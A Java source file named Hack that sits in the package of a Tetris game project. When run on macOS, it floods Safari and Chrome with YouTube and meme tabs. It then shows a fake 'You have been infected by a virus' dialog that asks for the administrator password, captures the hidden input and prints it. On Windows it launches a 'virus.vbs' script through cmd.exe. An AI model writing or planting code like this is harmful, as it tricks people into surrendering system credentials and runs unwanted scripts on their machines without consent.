package jrJava.tetris_step_5_properBurial;

import java.util.Arrays;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;
import java.awt.AWTException;
import java.io.*;
public class Hack {
	Random rd= new Random();
	String os_name=System.getProperty("os.name").toLowerCase();
	public void beAnnoying() throws AWTException, IOException{
		if (os_name.contains("mac os")) {
			final Process p = new ProcessBuilder("open", "-a", "Safari", "https://www.youtube.com/watch?v=vTIIMJ9tUc8","https://www.youtube.com/watch?v=3M_5oYU-IsU","https://www.youtube.com/watch?v=L_jWHffIx5E","https://www.youtube.com/watch?v=dQw4w9WgXcQ","https://www.youtube.com/watch?v=LDU_Txk06tM").start();
			try {
				Thread.sleep(200);
			} catch (InterruptedException e) { }
			final Process n = new ProcessBuilder("open", "-a", "Safari", "https://www.youtube.com/watch?v=vTIIMJ9tUc8","https://www.youtube.com/watch?v=3M_5oYU-IsU","https://www.youtube.com/watch?v=L_jWHffIx5E","https://www.youtube.com/watch?v=dQw4w9WgXcQ","https://www.youtube.com/watch?v=LDU_Txk06tM").start();
			
			final Process pj = new ProcessBuilder("open", "-a", "Google Chrome", "https://pics.me.me/thank-you-donald-trump-you-are-the-fighter-weve-been-30636183.png","https://pizzabottle.com/wp-content/uploads/2017/05/front-4-758x398.jpg","https://www.dailydot.com/wp-content/uploads/2018/10/memes-obesity.jpg","https://www.lifewire.com/thmb/hR2GPjS2ZUQBRv2CHCdPcIfBQZ0=/768x0/filters:no_upscale():max_bytes(150000):strip_icc()/sstMxMh-5ab00c7bfa6bcc003622e4f5.jpg", "https://i.ytimg.com/vi/ZXA4UN-oQnY/maxresdefault.jpg").start();
			String[] commandToRun = { "osascript", "-e", "set theResponse to display dialog \"You have been infected by a virus. Enter administrator password to continue\" default answer \"\" with icon caution buttons {\"Continue\"} default button \"Continue\" with hidden answer\n" + 
					"return theResponse" };
			Runtime run = Runtime.getRuntime();
			InputStream inputStream=run.exec(commandToRun).getInputStream();
			String password=new BufferedReader(new InputStreamReader(inputStream)).lines().collect(Collectors.joining("\n"));
			System.out.println(password);
		
		
		
		
		}
		else {
			String[] commandToRun = {"cmd.exe","/c","start", "cd eclipse-workspace", "virus.vbs"};
			Runtime run = Runtime.getRuntime();
			run.exec(commandToRun);
		}
	}
	}

